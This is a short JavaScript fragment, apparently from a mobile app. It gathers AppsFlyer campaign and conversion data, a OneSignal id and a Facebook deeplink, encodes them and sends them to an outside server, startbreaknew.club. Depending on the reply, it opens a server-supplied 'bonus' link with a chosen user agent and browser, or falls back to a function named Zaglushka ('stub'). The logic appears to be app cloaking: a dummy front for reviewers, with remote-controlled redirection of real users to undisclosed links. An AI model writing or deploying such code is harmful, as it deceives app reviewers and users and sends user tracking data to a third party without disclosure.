createSecondJson(json);
function createSecondJson(json){
	console.log("createSecondJsonStart");
	const data = {};
	Promise.all([initAppsFlyer(json),initOneSignal(json),initFacebook(json)]).then(value => {
			data.access_token = json.access_token;
			data.af_status = value[0].af_status;
			data.campaign_af = value[0].campaign;
			if (('activate_send_conversion_data' in json.extra)&&(json.extra.activate_send_conversion_data == 'true'))
				data.conversion_data = value[0].conversion_data;
			data.onesignal_id = value[1];
			data.deeplink_fb = value[2];
			console.log('FB:' + value[2]);

			Tester.Checker.check_second_request(data);
			console.log("data=" + JSON.stringify(data));
			secondPost(window.btoa(JSON.stringify(data)));
	});
}

async function secondPost(data){
	console.log("data=" + data);

	let response = await fetch("https://startbreaknew.club/api/v6/get-url", {
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		body: `data=${data}`
	});


 	if (response.status != 200)
 	 	Zaglushka();
 	else{
 		let json = await response.json();
 		 	console.log("secondresp:" + JSON.stringify(json));
 		if ('bonus' in json) {
 			if (isValidHttpUrl(json.bonus)) {
 				window.localStorage.setItem("bonuslink",json.bonus);
	 			if ('pid' in json.extra) {
					window.plugins.OneSignal.sendTag('pid',json.extra.pid);
				}
	 			if ('user_agent' in json.extra) window.localStorage.setItem("user_agent",json.extra.user_agent);
	 			if ('home_page' in json.extra) window.localStorage.setItem("home_page", json.extra.home_page);
	 			if ('target_browser' in json.extra) window.localStorage.setItem("target_browser", json.extra.target_browser);
	 			if ('dont_save_link' in json.extra) window.localStorage.setItem("dont_save_link", json.extra.dont_save_link);
	 			if ('old_save_links' in json.extra) window.localStorage.setItem("old_save_links", json.extra.old_save_links);
	 			openLink();
	 		}
	 		else Zaglushka();
 		} 
 		else Zaglushka();
 	}
}
